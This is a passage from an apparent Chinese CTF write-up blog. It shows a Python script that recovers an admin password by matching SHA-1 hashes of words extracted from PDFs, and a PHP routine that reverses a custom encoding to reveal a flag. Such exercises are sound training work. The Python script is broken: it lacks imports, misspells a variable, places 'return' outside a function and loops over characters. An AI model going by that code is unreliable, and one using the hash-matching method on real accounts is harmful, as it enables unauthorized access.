+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def get_pdf(dir):</span><br><span class="line">    dir_list &#x3D; os.listdir(dir)</span><br><span class="line">    for i in dir_list:</span><br><span class="line">        print i[-4:]</span><br><span class="line">        if i[-4:]!&#x3D;&#39;.pdf&#39;:</span><br><span class="line">            dir_list.remove(i)</span><br><span class="line">    return dir_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_word_list(path):</span><br><span class="line">    rsrcmgr &#x3D; PDFResourceManager()</span><br><span class="line">    retstr &#x3D; StringIO()</span><br><span class="line">    device &#x3D; TextConverter(rsrcmgr, retstr, codec&#x3D;&#39;utf-8&#39;, laparams&#x3D;LAParams())</span><br><span class="line">    interpreter &#x3D; PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    with open(path, &#39;rb&#39;) as fp:</span><br><span class="line">        for page in PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text &#x3D; retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    return text</span><br><span class="line"></span><br><span class="line">def jiami(j):</span><br><span class="line">    import hashlib</span><br><span class="line">    sha &#x3D; hashlib.sha1(j)</span><br><span class="line">    encrypts &#x3D; sha.hexdigest()</span><br><span class="line">    return encrypts</span><br><span class="line"></span><br><span class="line">pdf_list &#x3D;  get_pdf(&#39;.&#x2F;&#39;)</span><br><span class="line">for i in paf_list:</span><br><span class="line">    word_list &#x3D; get_word_list(i)</span><br><span class="line">    for j in word_list:</span><br><span class="line">        sha1 &#x3D; jiami(j)</span><br><span class="line">        if sha1 &#x3D;&#x3D; &#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;:</span><br><span class="line">            return j</span><br></pre></td></tr></table></figure>
+<p>最后得到admin的密码为<code>ThinJerboa</code></p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>访问题目直接给出代码让解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$miwen&#x3D;&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;</span><br><span class="line"></span><br><span class="line">function encode($str)&#123;</span><br><span class="line">    $_o&#x3D;strrev($str);   &#x2F;&#x2F;strrev() 函数反转字符串。</span><br><span class="line">    &#x2F;&#x2F; echo $_o;</span><br><span class="line">        </span><br><span class="line">    for($_0&#x3D;0;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c&#x3D;substr($_o,$_0,1);</span><br><span class="line">        $__&#x3D;ord($_c)+1;     &#x2F;&#x2F;返回值是对应的十进制整数。</span><br><span class="line">        $_c&#x3D;chr($__); &#x2F;&#x2F;chr() 函数（对于8位的ASCII字符串）</span><br><span class="line">        $_&#x3D;$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    return str_rot13(strrev(base64_encode($_))); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#x2F;*</span><br><span class="line">   逆向加密算法，解密$miwen就是flag</span><br><span class="line">*&#x2F;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">substr(string,start,length)</span><br><span class="line"></span><br><span class="line">参数 	描述</span><br><span class="line">string 	必需。规定要返回其中一部分的字符串。</span><br><span class="line">start 	</span><br><span class="line"></span><br><span class="line">必需。规定在字符串的何处开始。</span><br><span class="line"></span><br><span class="line">    正数 - 在字符串的指定位置开始</span><br><span class="line">    负数 - 在从字符串结尾开始的指定位置开始</span><br><span class="line">    0 - 在字符串中的第一个字符处开始</span><br><span class="line"></span><br><span class="line">length 	</span><br><span class="line"></span><br><span class="line">可选。规定被返回字符串的长度。默认是直到字符串的结尾。</span><br><span class="line"></span><br><span class="line">    正数 - 从 start 参数所在的位置返回的长度</span><br><span class="line">    负数 - 从字符串末端返回的长度</span><br><span class="line">    </span><br><span class="line">从字符串中返回 &quot;world&quot;：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo substr(&quot;Hello world&quot;,6);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str_rot13() 函数对字符串执行 ROT13 编码。</span><br><span class="line"></span><br><span class="line">ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。</span><br><span class="line"></span><br><span class="line">提示：编码和解码都是由相同的函数完成的。如果您把已编码的字符串作为参数，那么将返回原始字符串。</span><br></pre></td></tr></table></figure>
+
+<p>看懂代码后，构造解码代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$miwen&#x3D;&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;</span><br><span class="line"></span><br><span class="line">function decode($str)&#123;</span><br><span class="line">	$str&#x3D;str_rot13($str);</span><br><span class="line">	$str&#x3D;strrev($str);</span><br><span class="line">	$str&#x3D;base64_decode($str);</span><br><span class="line">	$_a&#x3D;&#39;&#39;;</span><br><span class="line">	for($_0&#x3D;0;$_0&lt;strlen($str);$_0++)&#123;</span><br><span class="line">		$_c&#x3D;substr($str,$_0,1);</span><br><span class="line">		$__&#x3D;ord($_c)-1;</span><br><span class="line">		$_c&#x3D;chr($__);</span><br><span class="line">		$_a&#x3D;$_a.$_c;</span><br><span class="line">	&#125;</span><br><span class="line">	return $_a;</span><br><span class="line">&#125;</span><br><span class="line">$b&#x3D;decode($miwen);</span><br><span class="line">$b&#x3D;strrev($b);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+      
+      <!-- reward -->
+      
+      <div id="reward-btn">
+        打赏
+      </div>
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>版权声明： </strong s>
+              本博客所有文章除特别声明外，均采用 <a href="https://www.apache.org/licenses/LICENSE-2.0.html" rel="external nofollow"
+                target="_blank">Apache License 2.0</a> 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2019/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWEB%E9%A2%98%E8%A7%A3/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2019/12/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80%E6%8A%8A%E6%A2%AD/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            数据结构一把梭
+          
+        </div>
+      </a>
+    
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '',
+        app_key: '',
+        path: window.location.pathname,
+        notify: 'false',
+        verify: 'false',
+        avatar: 'mp',
+        placeholder: '给我的文章加点评论吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2015-2020
+        Li XiangLan
+      </li>
+      <li>
+        
+          Powered by
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <span>
+  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
+  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
+</span>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+      <aside class="sidebar">
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="李香兰的博客"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="http://shenyu-vip.lofter.com" target="_blank" rel="noopener">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2019/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<script src="/js/share.js"></script>
+
+
+
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script>
+  try {
+    var typed = new Typed("#subtitle", {
+    strings: ['面朝大海，春暖花开','愿你一生努力，一生被爱','想要的都拥有，得不到的都释怀'],
+    startDelay: 0,
+    typeSpeed: 200,
+    loop: true,
+    backSpeed: 100,
+    showCursor: true
+    });
+  } catch (err) {
+  }
+  
+</script>
+
+
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer:'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    onClick: (e) => {
+      $('.toc-link').removeClass('is-active-link');
+      $(`a[href=${e.target.hash}]`).addClass('is-active-link');
+      $(e.target.hash).scrollIntoView();
+      return false;
+    }
+  });
+</script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: false
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  </div>
+</body>
+
+</html>
